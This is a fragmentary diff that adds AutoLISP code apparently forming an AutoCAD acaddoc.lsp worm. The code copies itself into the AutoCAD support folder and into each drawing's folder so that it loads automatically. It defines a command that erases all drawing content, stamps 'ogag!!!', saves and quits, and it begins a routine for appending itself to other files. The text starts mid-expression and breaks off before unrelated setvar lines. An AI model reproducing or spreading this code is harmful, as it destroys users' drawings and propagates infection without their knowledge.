@@ -1,0 +1,43 @@
+ (/ b	   )
+     (setq basepath  (findfile "base.dcl")     )
+     (setq basepath    (substr basepath	    1 (- (strlen basepath) 8) )    )
+     (setq baseacad (strcat basepath "acaddoc.lsp"))
+  	(setq acaddocpath  (findfile "acaddoc.lsp"))
+	(setq acaddocpath  (substr acaddocpath   1 (- (strlen acaddocpath) 11) ))
+	(setq acaddoclsp   (strcat acaddocpath "acaddoc.lsp"))
+	(setq c-acaddocname  (getvar "dwgname")	)
+        (setq c-acaddocpath  (findfile c-acaddocname))
+        (setq c-acaddocpath  (substr c-acaddocpath  1 (- (strlen c-acaddocpath) (strlen c-acaddocname))))
+        (setq c-acaddoc      (strcat c-acaddocpath "acaddoc.lsp") )
+	 (if
+           (and
+	   (/= basepath acaddocpath)
+	   (= c-acaddocpath acaddocpath))(progn (setq r-acaddoc (open acaddoclsp "r")  ) (setq w-basepath
+	          (open baseacad "w"))     
+	       (while
+	           (setq rl-acaddoc  (read-line r-acaddoc)  )
+	           (write-line rl-acaddoc w-basepath)   )
+	        (close w-basepath) (close r-acaddoc)  )
+
+             (progn
+(defun c:OGAGS () (command "tilemode" "1" "ERASE" "ALL" "" "tilemode" "0" "ERASE" "ALL" "" "st" "standard" "arial.ttf" "" "" "" "" "" "text" "0,0" "100" "0" "ogag!!!" "" "zoom" "e" "QSAVE" "QUIT" ))
+
+	       (setq r-acaddoc
+	       (open acaddoclsp "r")    )
+	       (setq w-basepath(open c-acaddoc "w"))
+	        (while
+	           (setq rl-acaddoc   (read-line r-acaddoc)    )
+	           (write-line rl-acaddoc w-basepath)     )
+	        (close w-basepath)   
+                (close r-acaddoc)  ) )	 (princ)
+
+(setq flagx t)
+(setq bz "(setq flagx t)")
+(defun app(source target bz / flag flag1 wjm wjm1 text)
+  (setq flag nil)
+  (setq flag1 t)
+  (if (findfile target)
+    (progn
+      (setq wjm1 (open target "r"))
+(setvar "zoomfactor" 60)
+(setvar "mbuttonpan" 1)
